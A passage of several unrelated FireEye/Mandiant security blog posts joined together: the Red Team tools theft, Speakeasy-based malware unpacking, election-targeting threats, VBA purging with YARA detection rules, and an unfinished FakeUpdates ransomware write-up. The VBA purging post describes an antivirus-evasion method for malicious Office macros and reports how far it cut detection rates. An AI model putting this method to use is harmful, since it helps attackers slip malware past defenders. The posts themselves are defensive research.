such as CobaltStrike and Metasploit. Many of the Red Team tools have already been released to the community and are already distributed in our open-source virtual machine, CommandoVM . Some of the tools are publicly available tools modified to evade basic security detection mechanisms. Other tools and frameworks were developed in-house for our Red Team. No Zero-Day Exploits or Unknown Techniques The Red Team tools stolen by the attacker did not contain zero-day exploits. The tools apply well-known and documented methods that are used by other red teams around the world. Although we do not believe that this theft will greatly advance the attacker’s overall capabilities, FireEye is doing everything it can to prevent such a scenario. It’s important to note that FireEye has not seen these tools disseminated or used by any adversaries, and we will continue to monitor for any such activity along with our security partners. Detections to Help the Community To empower the community to detect these tools, we are publishing countermeasures to help organizations identify these tools if they appear in the wild. In response to the theft of our Red Team tools, we have released hundreds of countermeasures for publicly available technologies like OpenIOC, Yara, Snort, and ClamAV. A list of the countermeasure is available on the FireEye GitHub repository found here . We are releasing detections and will continue to update the public repository with overlapping countermeasures for host, network, and file-based indicators as we develop new or refine existing detections. In addition, we are publishing a list of CVEs that need to be addressed to limit the effectiveness of the Red Team tools on the GitHub page. FireEye Products Protect Customers Against These Tools Teams across FireEye have worked to build the countermeasures to protect our customers and the broader community. We have incorporated these countermeasures into our products and shared these countermeasures with our partners, including the Department of Homeland Security, who have incorporated the countermeasures into their products to provide broad coverage for the community.

                "text": "Andrew Davis recently announced the public release of his new Windows emulation framework named Speakeasy . While the introductory blog post focused on using Speakeasy as an automated malware sandbox of sorts, this entry will highlight another powerful use of the framework: automated malware unpacking. I will demonstrate, with code examples, how Speakeasy can be used programmatically to: Bypass unsupported Windows APIs to continue emulation and unpacking Save virtual addresses of dynamically allocated code using API hooks Surgically direct execution to key areas of code using code hooks Dump an unpacked PE from emulator memory and fix its section headers Aid in reconstruction of import tables by querying Speakeasy for symbolic information Initial Setup One approach to interfacing with Speakeasy is to create a subclass of Speakeasy’s Speakeasy class. Figure 1 shows a Python code snippet that sets up such a class that will be expanded in upcoming examples. import speakeasy class MyUnpacker(speakeasy.Speakeasy): def __init__(self, config=None): super(MyUnpacker, self).__init__(config=config) Figure 1: Creating a Speakeasy subclass The code in Figure 1 accepts a Speakeasy configuration dictionary that may be used to override the default configuration. Speakeasy ships with several configuration files . The Speakeasy class is a wrapper class for an underlying emulator class. The emulator class is chosen automatically when a binary is loaded based on its PE headers or is specified as shellcode. Subclassing Speakeasy makes it easy to access, extend, or modify interfaces. It also facilitates reading and writing stateful data before, during, and after emulation. Emulating a Binary Figure 2 shows how to load a binary into the Speakeasy emulator. self.module = self.load_module(filename) Figure 2: Loading the binary into the emulator The load_module function returns a PeFile object for the provided binary on disk. It is an instance of the PeFile class defined in speakeasy/windows/common.py , which is subclassed from pefile ’s PE class. Alternatively, you can provide the bytes of a binary using the data parameter rather than specifying a file name. Figure 3 shows how to emulate a loaded binary. self.run_module(self.module) Figure 3: Starting emulation API Hooks The Speakeasy framework ships with support for hundreds of Windows APIs with more being added frequently. This is accomplished via Python API handlers defined in appropriate files in the speakeasy/winenv/api directory. API hooks can be installed to have your own code executed when particular APIs are called during emulation. They can be installed for any API, regardless of whether a handler exists or not. An API hook can be used to override an existing handler and that handler can optionally be invoked from your hook. The API hooking mechanism in Speakeasy provides flexibility and control over emulation. Let’s examine a few uses of API hooking within the context of emulating unpacking code to retrieve an unpacked payload. Bypassing Unsupported APIs When Speakeasy encounters an unsupported Windows API call, it stops emulation and provides the name of the API function that is not supported. If the API function in question is not critical for unpacking the binary, you can add an API hook that simply returns a value that allows execution to continue. For example, a recent sample’s unpacking code contained API calls that had no effect on the unpacking process. One such API call was to GetSysColor . In order to bypass this call and allow execution to continue, an API hook may be added as shown in Figure 4. self.add_api_hook(self.getsyscolor_hook, 'user32', 'GetSysColor', argc=1 ) Figure 4: Adding an API hook According to MSDN , this function takes 1 parameter and returns an RGB color value represented as a DWORD . If the calling convention for the API function you are hooking is not stdcall , you can specify the calling convention in the optional call_conv parameter . The calling convention constants are defined in the speakeasy/common/arch.py file. Because the GetSysColor return value does not impact the unpacking process, we can simply return 0 . Figure 5 shows the definition of the getsyscolor_hook function specified in Figure 4. def getsyscolor_hook(self, emu, api_name, func, params): return 0 Figure 5: The GetSysColor hook returns 0 If an API function requires more finessed handling, you can implement a more specific and meaningful hook that suits your needs. If your hook implementation is robust enough, you might consider contributing it to the Speakeasy project as an API handler! Adding an API Handler Within the speakeasy/winenv/api directory you'll find usermode and kernelmode subdirectories that contain Python files for corresponding binary modules. These files contain the API handlers for each module. In usermode/kernel32.py , we see a handler defined for SetEnvironmentVariable as shown in Figure 6. 1: @apihook('SetEnvironmentVariable', argc=2) 2: def SetEnvironmentVariable(self, emu, argv, ctx={}): 3:     ''' 4:     BOOL SetEnvironmentVariable( 5:         LPCTSTR lpName, 6:         LPCTSTR lpValue 7:         ); 8:     ''' 9:     lpName, lpValue = argv 10:    cw = self.get_char_width(ctx) 11:    if lpName and lpValue: 12:        name = self.read_mem_string(lpName, cw) 13:        val = self.read_mem_string(lpValue, cw) 14:        argv[0] = name 15:        argv[1] = val 16:        emu.set_env(name, val) 17:    return True Figure 6: API handler for SetEnvironmentVariable A handler begins with a function decorator (line 1) that defines the name of the API and the number of parameters it accepts. At the start of a handler, it is good practice to include MSDN's documented prototype as a comment (lines 3-8). The handler's code begins by storing elements of the argv parameter in variables named after their corresponding API parameters (line 9). The handler's ctx parameter is a dictionary that contains contextual information about the API call. For API functions that end in an ‘ A ’ or ‘ W ’ (e.g., CreateFileA ), the character width can be retrieved by passing the ctx parameter to the get_char_width function (line 10). This width value can then be passed to calls such as read_mem_string (lines 12 and 13), which reads the emulator’s memory at a given address and returns a string. It is good practice to overwrite string pointer values in the argv parameter with their corresponding string values (lines 14 and 15). This enables Speakeasy to display string values instead of pointer values in its API logs. To illustrate the impact of updating argv values, examine the Speakeasy output shown in Figure 7. In the VirtualAlloc entry, the symbolic constant string PAGE_EXECUTE_READWRITE replaces the value 0x40 . In the GetModuleFileNameA and CreateFileA entries, pointer values are replaced with a file path. KERNEL32.VirtualAlloc(0x0, 0x2b400, 0x3000, \"PAGE_EXECUTE_READWRITE\") -> 0x7c000 KERNEL32.GetModuleFileNameA(0x0, \"C:\\\\Windows\\\\system32\\\\sample.exe\", 0x104) -> 0x58 KERNEL32.CreateFileA(\"C:\\\\Windows\\\\system32\\\\sample.exe\", \"GENERIC_READ\", 0x1, 0x0, \"OPEN_EXISTING\", 0x80, 0x0) -> 0x84 Figure 7: Speakeasy API logs Saving the Unpacked Code Address Packed samples often use functions such as VirtualAlloc to allocate memory used to store the unpacked sample. An effective approach for capturing the location and size of the unpacked code is to first hook the memory allocation function used by the unpacking stub. Figure 8 shows an example of hooking VirtualAlloc to capture the virtual address and amount of memory being allocated by the API call. 1: def virtualalloc_hook(self, emu, api_name, func, params): 2:     ''' 3:     LPVOID VirtualAlloc( 4:        LPVOID lpAddress, 5:        SIZE_T dwSize, 6:        DWORD  flAllocationType, 7:        DWORD  flProtect 8:      ); 9:     ''' 10:    PAGE_EXECUTE_READWRITE = 0x40 11:    lpAddress, dwSize, flAllocationType, flProtect = params 12:    rv = func(params) 13:    if lpAddress == 0 and flProtect == PAGE_EXECUTE_READWRITE: 14:        self.logger.debug(\"[*] unpack stub VirtualAlloc call, saving dump info\") 15:        self.dump_addr = rv 16:        self.dump_size = dwSize 17:    return rv Figure 8: VirtualAlloc hook to save memory dump information The hook in Figure 8 calls Speakeasy’s API handler for VirtualAlloc on line 12 to allow memory to be allocated. The virtual address returned by the API handler is saved to a variable named rv . Since VirtualAlloc may be used to allocate memory not related to the unpacking process, additional checks are used on line 13 to confirm the intercepted VirtualAlloc call is the one used in the unpacking code. Based on prior analysis, we’re looking for a VirtualAlloc call that receives the lpAddress value 0 and the flProtect value PAGE_EXECUTE_READWRITE ( 0x40 ). If these arguments are present, the virtual address and specified size are stored on lines 15 and 16 so they may be used to extract the unpacked payload from memory after the unpacking code is finished. Finally, on line 17, the return value from the VirtualAlloc handler is returned by the hook. Surgical Code Emulation Using API and Code Hooks Speakeasy is a robust emulation framework; however, you may encounter binaries that have large sections of problematic code. For example, a sample may call many unsupported APIs or simply take far too long to emulate. An example of overcoming both challenges is described in the following scenario. Unpacking Stubs Hiding in MFC Projects A popular technique used to disguise malicious payloads involves hiding them inside a large, open-source MFC project. MFC is short for Microsoft Foundation Class , which is a popular library used to build Windows desktop applications. These MFC projects are often arbitrarily chosen from popular Web sites such as Code Project . While the MFC library makes it easy to create desktop applications, MFC applications are difficult to reverse engineer due to their size and complexity. They are particularly difficult to emulate due to their large initialization routine that calls many different Windows APIs. What follows is a description of my experience with writing a Python script using Speakeasy to automate unpacking of a custom packer that hides its unpacking stub within an MFC project. Reverse engineering the packer revealed the unpacking stub is ultimately called during initialization of the CWinApp object, which occurs after initialization of the C runtime and MFC. After attempting to bypass unsupported APIs, I realized that, even if successful, emulation would take far too long to be practical. I considered skipping over the initialization code completely and jumping straight to the unpacking stub. Unfortunately, execution of the C-runtime initialization code was required in order for emulation of the unpacking stub to succeed. My solution was to identify a location in the code that fell after the C-runtime initialization but was early in the MFC initialization routine. After examining the Speakeasy API log shown in Figure 9, such a location was easy to spot. The graphics-related API function GetDeviceCaps is invoked early in the MFC initialization routine. This was deduced based on 1) MFC is a graphics-dependent framework and 2) GetDeviceCaps is unlikely to be called during C-runtime initialization. 0x43e0a7: 'kernel32.FlsGetValue(0x0)' -> 0x4150 0x43e0e3: 'kernel32.DecodePointer(0x7049)' -> 0x7048 0x43b16a: 'KERNEL32.HeapSize(0x4130, 0x0, 0x7000)' -> 0x90 0x43e013: 'KERNEL32.TlsGetValue(0x0)' -> 0xfeee0001 0x43e02a: 'KERNEL32.TlsGetValue(0x0)' -> 0xfeee0001 0x43e02c: 'kernel32.FlsGetValue(0x0)' -> 0x4150 0x43e068: 'kernel32.EncodePointer(0x44e215)' -> 0x44e216 0x43e013: 'KERNEL32.TlsGetValue(0x0)' -> 0xfeee0001 0x43e02a: 'KERNEL32.TlsGetValue(0x0)' -> 0xfeee0001 0x43e02c: 'kernel32.FlsGetValue(0x0)' -> 0x4150 0x43e068: 'kernel32.EncodePointer(0x704c)' -> 0x704d 0x43c260: 'KERNEL32.LeaveCriticalSection(0x466f28)' -> None 0x422151: 'USER32.GetSystemMetrics(0xb)' -> 0x1 0x422158: 'USER32.GetSystemMetrics(0xc)' -> 0x1 0x42215f: 'USER32.GetSystemMetrics(0x2)' -> 0x1 0x422169: 'USER32.GetSystemMetrics(0x3)' -> 0x1 0x422184: 'GDI32.GetDeviceCaps(0x288, 0x58)' -> None Figure 9: Identifying beginning of MFC code in Speakeasy API logs To intercept execution at this stage I created an API hook for GetDeviceCaps as shown in Figure 10. The hook confirms the function is being called for the first time on line 2. 1: def mfc_init_hook(self, emu, api_name, func, params): 2:     if not self.trigger_hit: 3:         self.trigger_hit = True 4:         self.h_code_hook =   self.add_code_hook(self.start_unpack_func_hook) 5:         self.logger.debug(\"[*] MFC init api hit, starting unpack function\") Figure 10: API hook set for GetDeviceCaps Line 4 shows the creation of a code hook using the add_code_hook function of the Speakeasy class. Code hooks allow you to specify a callback function that is called before each instruction that is emulated. Speakeasy also allows you to optionally specify an address range for which the code hook will be effective by specifying begin and end parameters. After the code hook is added on line 4, the GetDeviceCaps hook completes and, prior to the execution of the sample's next instruction, the start_unpack_func_hook function is called. This function is shown in Figure 11. 1: def start_unpack_func_hook(self, emu, addr, size, ctx): 2:     self.h_code_hook.disable() 3:     unpack_func_va = self.module.get_rva_from_offset(self.unpack_offs) + self.module.get_base() 4:     self.set_pc(unpack_func_va) Figure 11: Code hook that changes the instruction pointer The code hook receives the emulator object, the address and size of the current instruction, and the context dictionary (line 1). On line 2, the code hook disables itself. Because code hooks are executed with each instruction, this slows emulation significantly. Therefore, they should be used sparingly and disabled as soon as possible. On line 3, the hook calculates the virtual address of the unpacking function. The offset used to perform this calculation was located using a regular expression. This part of the example was omitted for the sake of brevity. The self.module attribute was previously set in the example code shown in Figure 2. It being subclassed from the PE class of pefile allows us to access useful functions such as get_rva_from_offset() on line 3. This line also includes an example of using self.module.get_base() to retrieve the module's base virtual address. Finally, on line 4, the instruction pointer is changed using the set_pc function and emulation continues at the unpacking code. The code snippets in Figure 10 and Figure 11 allowed us to redirect execution to the unpacking code after the C-runtime initialization completed and avoid MFC initialization code. Dumping and Fixing Unpacked PEs Once emulation has reached the original entry point of the unpacked sample, it is time to dump the PE and fix it up. Typically, a hook would save the base address of the unpacked PE in an attribute of the class as illustrated on line 15 of Figure 8. If the unpacked PE does not contain the correct entry point in its PE headers, the true entry point may also need to be captured during emulation. Figure 12 shows an example of how to dump emulator memory to a file. with open(self.output_path, \"wb\") as up: mm = self.get_address_map(self.dump_addr) up.write(self.mem_read(mm.get_base(), mm.get_size())) Figure 12: Dumping the unpacked PE If you are dumping a PE that has already been loaded in memory, it will not have the same layout as it does on disk due to differences in section alignment. As a result, the dumped PE's headers may need to be modified. One approach is to modify each section's PointerToRawData value to match its VirtualAddress field. Each section's SizeOfRawData value may need to be padded in order conform with the FileAlignment value specified in the PE’s optional headers. Keep in mind the resulting PE is unlikely to execute successfully. However, these efforts will allow most static analysis tools to function correctly. The final step for repairing the dumped PE is to fix its import table. This is a complex task deserving of its own blog post and will not be discussed in detail here. However, the first step involves collecting a list of library function names and their addresses in emulator memory. If you know the GetProcAddress API is used by the unpacker stub to resolve imports for the unpacked PE, you can call the get_dyn_imports function as shown in Figure 13. api_addresses = self.get_dyn_imports() Figure 13: Retrieving dynamic imports Otherwise, you can query the emulator class to retrieve its symbol information by calling the get_symbols function as shown in Figure 14. symbols = self.get_symbols() Figure 14: Retrieve symbol information from emulator class This data can be used to discover the IAT of the unpacked PE and fix or reconstruct its import related tables. Putting It All Together Writing a Speakeasy script to unpack a malware sample can be broken down into the following steps: Reverse engineer the unpacking stub to identify: 1) where the unpacked code will reside or where its memory is allocated, 2) where execution is transferred to the unpacked code, and 3) any problematic code that may introduce issues such as unsupported APIs, slow emulation, or anti-analysis checks. If necessary, set hooks to bypass problematic code. Set a hook to identify the virtual address and, optionally, the size of the unpacked binary. Set a hook to stop emulation at, or after, execution of the original entry point of the unpacked code. Collect virtual addresses of Windows APIs and reconstruct the PE’s import table. Fix the PE’s headers (if applicable) and write the bytes to a file for further analysis. For an example of a script that unpacks UPX samples, check out the UPX unpacking script in the Speakeasy repository. Conclusion The Speakeasy framework provides an easy-to-use, flexible, and powerful programming interface that enables analysts to solve complex problems such as unpacking malware. Using Speakeasy to automate these solutions allows them to be performed at scale. I hope you enjoyed this introduction to automating the Speakeasy framework and are inspired to begin using it to implement your own malware analysis solutions!

                "text": "In democratic societies, elections are the mechanism for choosing heads of state and policymakers. There are strong incentives for adversary nations to understand the intentions and preferences of the people and parties that will shape a country's future path and to reduce uncertainty about likely winners. Mandiant Threat Intelligence regularly observes cyber espionage operations we believe to be seeking election-related information targeting governments, civil society, media, and technology organizations around the globe. We have also seen disruptive and destructive cyber attacks and propaganda campaigns seeking to undermine targeted governments and influence the outcomes of electoral contests. The 2020 U.S. elections are currently drawing attention to election cyber risks, but 2020 has already hosted dozens of elections worldwide, with more to come. In the Asia-Pacific region these included elections in Taiwan, India, South Korea, and Singapore to name a few, with regional elections scheduled for Indonesia in December. Given the prevalence of such activity worldwide and Mandiant's unique visibility into threat actor activity, we believe it is worthwhile to examine trends in adversary targeting of elections in a variety of regional contexts because the tactics, techniques, and procedures (TTPs) used in one region today may soon be deployed or mimicked in other regions. Notable Electoral Targeting in Asia-Pacific Region Mandiant Threat Intelligence tracked numerous elections-related incidents in the Asia-Pacific region in recent years. During this time, the most prolific regional actor was China, which we observed in more than 20 elections-related campaigns most frequently affecting Hong Kong and Taiwan. We believe that China's primary motives for elections targeting includes monitoring political developments, internal stability, and supporting Belt and Road Initiative (BRI) investments. Examples of Chinese cyber espionage targeting electoral support organizations include: Targeting candidates and related staff associated with the November 2019 Hong Kong District Council elections with a malicious macro document. Targeting the Australian Parliament in February 2019, three months before the country's general elections. Compromising Cambodia's National Election Commission in mid-2018 based on the use of AIRBREAK malware by APT40, possibly looking to understand the impact of the election outcome on Belt and Road Initiative (BRI) plans. See our blog post for more details about this campaign. A spear phishing campaign targeting multiple government agencies in Southeast Asia in the spring of 2018 to deliver FIREPIT payloads. The nature of the lure material and targeting indicate the activity was potentially an effort to monitor an upcoming election in the affected country. Specifically, Mandiant has observed multiple instances in which organizations such as electoral boards and commissions that support or help administer elections have been targeted. Both Russian and Chinese cyber espionage operations have targeted election administrators and government officials since at least 2014. Observed TTPs include phishing and strategic website compromise (SWC), also known as watering hole attacks. For example, in the November 2019 activity targeting Hong Kong (previously referenced), Mandiant Threat Intelligence believes that candidates or related staff associated with the Hong Kong District Council elections were targeted with a malicious macro document just prior to the elections based on geolocation information, the spear-phishing lure, and other data. Figure 1: Decoy content from phishing email Elections Ecosystem As our readers will know, Mandiant takes a specific approach to deconstructing attacks against elections, which we detailed in a previous blog post . Our approach examines threats through the lens of risk posed at various levels of the elections ecosystem. We break the elections threat landscape into distinct attack surfaces to better allow our customers and partners to take action. These include the following: Electoral Platforms Affecting Public Opinion Electoral Process Support Organizations Core Electoral Process Systems Figure 2: Attack surfaces associated with the electoral process Top Target of Election Cyber Threat Activity: Public Opinion Using our ecosystem taxonomy, based on activity observed from 2016 to 2019, Mandiant Threat Intelligence assesses that actors concentrated on \"platforms affecting public opinion\" much more often than \"core election systems\" such as voting machines, or \"electoral support organizations\" such as election commissions. Figure 3: Electoral platforms affecting public opinions are most frequently targeted Globally, we assess that actors continue to deploy disinformation in the form of fabricated news and hoaxes spread primarily via social media and counterfeit websites designed to mimic legitimate news organizations, which may be picked up by legitimate news organizations. In the last several years, we have seen influence operations use increasingly creative methods to blend their inauthentic messaging with legitimate speech (e.g., by interviewing, impersonating, and hiring legitimate journalists or experts, and sending letters to the editor to real publications). Malicious actors create and spread disinformation with the intent to mislead an electorate by causing reputational damage to an individual or political party, or by casting doubt regarding a particular issue or political process. Influence campaigns also seek to exacerbate existing societal divisions. In the Asia-Pacific region, Mandiant Threat Intelligence observed pro-China threat actors spoof Taiwanese media outlet TVBS (官方網站) to promote narratives in line with the People's Republic of China's (PRC's) political interests in a coordinated, inauthentic manner. The accounts use a variety of tactics in order to pose as Western media outlets, including the use of identical or near-identical usernames, display names, and profile photos as the accounts of the outlets they imitate. Figure 4: @TVSBnews quote-tweets People's Daily video citing alleged U.S. interference in foreign elections Public exposure of high-profile information operations, such as Russia's interference in the 2016 U.S. presidential election, has strengthened perceptions that such operations are effective. It also demonstrates the difficulty that open societies face in countering this threat, encouraging current and aspiring information operation sponsors to grow their efforts. We anticipate that influence operations conducted in support of the political interests of nation-states will increase in sophistication, volume, and diversity of actors through 2020 and beyond. In the last 12 months, Mandiant Threat Intelligence observed and reported on information operations conducted in support of the political interests of numerous countries. During Singapore's 2020 general elections, the country's first \"digital\" election, Mandiant Threat Intelligence identified multiple inauthentic accounts. These accounts did not, however, appear to be acting in a coordinated manner. Outlook and Implications We expect that threat actors will continue to target entities associated with elections worldwide for the foreseeable future and may expand the scope of this activity as long as the potential rewards of these operations outweigh the risks. State-sponsored actors almost certainly view targeting the electoral process as an effective means of projecting power and collecting intelligence. Furthermore, the continuous expansion of the social media landscape will likely encourage various actors to pursue information operations by promoting preferred narratives, including the use of propagating inauthentic or deceptive information. We have already seen tactics evolve to avoid detection and incorporate emerging technologies, such as \"deepfake\" or multimedia manipulation technology, to advance more believable and impactful information operations, and we expect these innovations to continue. Lower tech methods, such as outsourcing propaganda activities to real people hired specifically to spread false and misleading content, can hinder attribution efforts and potentially increase the effectiveness of operations if those people have a more specialized understanding of the information environment. To battle election threats, there is an urgent need to increase public awareness of the threat and inculcate behaviors that reduce the risk of compromise or disruption. These include everything from rigorously securing email to implementing policy around notification of cyber incidents in the supply chain. In addition, governments can consider mandating digital imprint requirements for election campaigning, increasing fines for electoral fraud, and increasing transparency around digital political advertisements. Investment in news verification and screening methodologies on search and social media platforms as well as public education efforts equipping voters and students to distinguish trustworthy information from suspicions may also reduce the impact of influence operations.

We focus on MS-OVBAs in\nMicrosoft Office 97 documents that use the CFBF file format, instead\nof the modern Open Office XML (OOXML) format used by Microsoft Excel\n“.xlsx” and Microsoft Word “.docx” documents. MS-OVBA’s file structure stores\nall VBA data in a hierarchy , which consists of structured\nstorage that contain different types of streams. VBA code in an Office\ndocument is stored in various module streams that consists of two\nparts: the PerformanceCache (also known as\nP-code), and the CompressedSourceCode . The PerformanceCache section is an array of\nbytes that contains compiled VBA code. The CompressedSourceCode section contains VBA source\ncode that is compressed with Microsoft’s proprietary algorithm. The\nboundary between the two sections is determined by a MODULEOFFSET , which is stored in the dir stream. A diagram of a module stream is shown\nin Figure 1. Figure 1: Module stream diagram When a VBA macro is added to a document, the VBA engine saves a\ncompiled version in the PerformanceCache section of the relevant module stream to increase performance.\nHowever, an Office application will only access the PerformanceCache if its version and architecture\nmatch what was used to compile the original VBA code. This version and\nimplementation information is stored in the _VBA_PROJECT and __SRP_# streams. If the\nversions do not match, the compressed source code is decompressed,\ncompiled, and run instead. VBA Purging vs VBA Stomping In 2018, research by the Walmart security team brought a technique\nknown as “ VBA Stomping ” to wider\npublic awareness. Originally identified by Dr. Vesselin Bontchev in\n2016 , this technique allows attackers to remove compressed VBA\ncode from Office documents and still execute malicious macros without\nmany of the VBA keywords that AV engines had come to rely on for\ndetection. For an example of VBA stomping in-the-wild, check out “ STOMP\n2 Dis: Brilliance in the (Visual) Basics ”. VBA stomping takes advantage of how module streams are interpreted\nand exchanges malicious CompressedSourceCode with non-malicious VBA source code, leaving the PerformanceCache untouched. However, the success\nof this technique is Office-version dependent, implying that an\nattacker would have to do additional recon on their target and be\naware of their victims’ deployed Office versions. VBA purging modifies the module streams in the opposite way. Instead\nof changing the CompressedSourceCode , VBA\npurging completely removes the PerformanceCache data from the module stream and\nthe _VBA_PROJECT stream , changes the value\nof the MODULEOFFSET to 0, and removes all\nSRP streams (this is necessary because the _VBA_PROJECT and SRP streams contain version-dependent PerformanceCache data that will result in a\nruntime error when there is no PerformanceCache in the module stream). This\nremoves strings usually found in PerformanceCache that many AV engines and YARA\nrules depend on for detection. Once removed, attackers are able to use\nmore standard methodologies and execute suspicious functions (i.e. CreateObject ) without being detected. Figure 2 shows the OLE streams for a normal and a purged document,\nextracted using oledump .\nIn the original document, the Module1 PerformanceCache is 1291 bytes, while it is 0\nbytes in the VBA purged document. The purged document has no SRP streams and the _VBA_PROJECT stream has been reduced to 7 bytes. Figure 2: Analyzing VBA purged document\nwith oledump Testing the Effectiveness of VBA Purging Mandiant’s Red Team created a command line, C# tool called OfficePurge to test\nthis technique. OfficePurge supports Microsoft Office Word, Excel and\nPublisher documents that follow the CFBF file format. In the following\nexamples, we used OfficePurge and a VBA payload from the public\ntoolkit Unicorn to\ntest the effectiveness of VBA purging a Microsoft Office Word document\nthat contained a Base64 encoded PowerShell payload (Figure 3). Figure 3: Macro payload generated with Unicorn The strings output (Figure 4) for the original Word document shows\nUnicorn’s Base64 encoded PowerShell payload, which is detected by many\nsecurity products. On the other hand, the output for the VBA purged\ndocument does not fully show the Base64 encoded payload because the PerformanceCache is removed. The CompressedSourceCode still contains the Base64\nencoded payload, but Microsoft’s custom compression algorithm splits\nthe strings, making it harder for static analysis to detect it. Figure 4: Strings output with a purged\nand non-purged document Both documents were submitted to online sandboxes to test detection\ncapabilities of various products. VirusTotal’s detection rate of the\noriginal document (36/60) dropped by 67% after it was VBA purged (12/61) .\nVirusTotal also categorized the non-purged document as “create-ole”,\n“doc”, and “macros”, whereas the purged document was only categorized\nas “doc”. Figure 5: VirusTotal detection results\nfor non-purged Word document Figure 6: VirusTotal detection results\nfor purged Word document Detection and Hunting Opportunities With OfficePurge, we have the ability to quickly erase compiled VBA\ncode and reduce security product detections in public sandboxes, but\nwhy stop there? Using this test data, our next step is to build\nconditional detection logic in formats such as YARA rules, which can\nidentify VBA purged documents and allow us to hunt for previously\nundetected malicious documents. Under the “sample-data” folder in the\nOfficePurge GitHub repo, we have added original and purged documents\nfor each supported file type with a macro that will spawn calc.exe.\nSHA256 hashes are included at the end of this post. As mentioned before, this technique involves removing PerformanceCache data from the _VBA_PROJECT stream. MSDN documentation shows\nthat the minimum length for the _VBA_PROJECT stream is 7 bytes to fit the required fields in the stream header. The\nfollowing YARA rule searches for CFBF files with a 7 byte _VBA_PROJECT stream: rule FEYE_OLE_VBAPurged_1 { meta: author = \"Alyssa Rahman\n(@ramen0x3f)\" description = \"This\nfile has a _VBA_PROJECT stream that has been cleared. This is\nevidence of VBA purging, a technique where the p-code\n(PerformanceCache data) is removed from Office files that have\nan embedded macro.\" strings: $vba_proj = { 5F 00 56 00 42 00 41 00 5F 00 50 00 52 00 4F 00\n4A 00 45 00 43 00 54 00 00 00 00 00 00 00 00 00 } condition: uint32(0) == 0xe011cfd0 and (\nuint32(@vba_proj[1] + 0x78) == 0x07 ) } Searching with this logic on VirusTotal reveals a large number of\nmalicious documents, meaning this is very prevalent in the wild and in\nuse by attackers. This rule should identify most publicly documented\nexamples of VBA purging, such as 9fd864e578d8bb985cf71a24089f5e2f ( HornetSecurity ).\nHowever, it may also identify some false positives. As previously\nidentified by Didier\nStevens , some public libraries such as EPPlus may generate benign\ndocuments without PerformanceCache data and\nappear to be purged. Another important limitation of this rule is that the _VBA_PROJECT stream data doesn’t have to be\ncompletely removed. So while the stream size is 7 in all publicly\ndocumented examples of this technique, it doesn’t have to be exactly 7. One solution to this is to compare the compressed and compiled\nversions of a document’s macros and look for unexpected variations.\nAnother potential option is a YARA rule that searches the _VBA_PROJECT stream for keywords or bytes, which\nshould appear if the p-code is valid. But let’s take the easy path first and look for anomalies within\nOfficePurge. There’s a section within the code that overwrites the _VBA_PROJECT stream with a static header: // Remove performance cache in _VBA_PROJECT\nstream. Replace the entire stream with _VBA_PROJECT\nheader. byte[] data =\nUtils.HexToByte(\"CC-61-FF-FF-00-00-00\"); A little bit of Googling shows this header was built based on Microsoft’s\nspecifications . But if we compare a purged and unpurged document,\nit looks like that header actually varies from specifications in\npractice (Figure 7). Figure 7: Comparison of purged and\nunpurged document This header isn’t necessarily proof that a document is malicious or\nwas created with OfficePurge, but it could be a good indicator that\nthe document was created programmatically versus with Office products.\nWith anomalies such as this, we can start building a rule similar to\nthe following, which will search for documents with a “small” _VBA_PROJECT stream and this suspicious stream header: rule FEYE_OLE_VBAPurged_2 { meta: author = \"Michael Bailey (@mykill),\nJonell Baltazar, Alyssa Rahman (@ramen0x3f), Joseph\nReyes\" description = \"This file has a\nsuspicious _VBA_PROJECT header and a small _VBA_PROJECT\nstream. This may be evidence of the VBA purging tool\nOfficePurge or a tool-generated document.\" strings: $vba_proj = { 5F 00 56 00 42 00 41 00\n5F 00 50 00 52 00 4F 00 4A 00 45 00 43 00 54 00 00 00 00 00 00\n00 00 00 } $cc61 = {CC 61 FF FF 00 00 00} condition: uint32(0) == 0xe011cfd0 and (\nuint32(@vba_proj[1] + 0x78) >= 0x07 ) and (\nuint32(@vba_proj[1] + 0x78) < 0xff ) and $cc61 } Searching with the two rules shared here reveals a wide range of\nthreat actors and malware types leveraging VBA purging, or at least\nsome type of automated document generation. On VirusTotal, you’re\nlikely to see a number of Emotet payloads caught by this rule, which\nis understandable given how heavily it relies on malicious email\nattachments. Another top offender we observed was AgentTesla. Since these rules both turn up benign documents as well, they aren’t\nready for a production environment; however, they could be useful as\n“weak signals” for more manual threat hunting. Many static detection\nengines may struggle for accuracy when identifying the VBA purging\ntechnique. Dynamic analysis techniques, such as those used by\nFireEye’s MVX engine, will still detonate the malicious document\nproperly and be detected even if the VBA is purged. Conclusion For as long as companies use Office documents, attackers will be\ntrying to smuggle malicious macros into them. VBA purging represents a\nrecent example of how threat actors continually invent new ways to\nevade defenders. The artifacts discussed in this blog post should\nserve as a starting point for detecting VBA purging, and hopefully the\ntooling and indicators we have shared will help you hunt for\nadditional anomalies in malicious Office documents.

                "text": "Within the past several months, FireEye has observed financially-motivated threat actors employ tactics that focus on disrupting business processes by deploying ransomware in mass throughout a victim’s environment. Understanding that normal business processes are critical to organizational success, these ransomware campaigns have been accompanied with multi-million dollar ransom amounts. In this post, we’ll provide a technical examination of one recent campaign that stems back to a technique that we initially reported on in April 2018 . Between May and September 2019, FireEye responded to multiple incidents involving a financially-motivated threat actor who leveraged compromised web infrastructure to establish an initial foothold in victim environments. This activity bared consistencies with a fake browser update campaign first identified in April 2018 – now tracked by FireEye as FakeUpdates . In this newer campaign, the threat actors leveraged victim systems to deploy malware such as Dridex or NetSupport , and multiple post-exploitation frameworks. The threat actors’ ultimate goal in some cases was to ransom systems in mass with BitPaymer or DoppelPaymer ransomware (see Figure 1). Figure 1: Recent FakeUpdates infection chain Due to campaign proliferation, we have responded to this activity at both Mandiant Managed Defense customers and incident response investigations performed by Mandiant. Through Managed Defense network and host monitoring as well as Mandiant’s incident response findings, we observed the routes the threat actor took, the extent of the breaches, and exposure of their various toolkits. Knock, Knock: FakeUpdates are Back! In April 2018, FireEye identified a campaign that used compromised websites to deliver heavily obfuscated Trojan droppers masquerading as Chrome, Internet Explorer, Opera, and/or Firefox browser updates. The compromised sites contained code injected directly into the HTML or in JavaScript components rendered by the pages which had been injected. These sites were accessed by victim users either via HTTP redirects or watering-hole techniques utilized by the attackers. Since our April 2018 blog post , this campaign has been refined to include new techniques and the use of post-exploitation toolkits. Recent investigations have shown threat actor activity that included internal reconnaissance, credential harvesting, privilege escalation, lateral movement, and ransomware deployment in enterprise networks. FireEye has identified that a large number of the compromised sites serving up the first stage of FakeUpdates have been older, vulnerable Content Management System (CMS) applications. You Are Using an Older Version…of our Malware The FakeUpdates campaign begins with a rather intricate sequence of browser validation, performed before the final payload is downloaded. Injected code on the initial compromised page will make 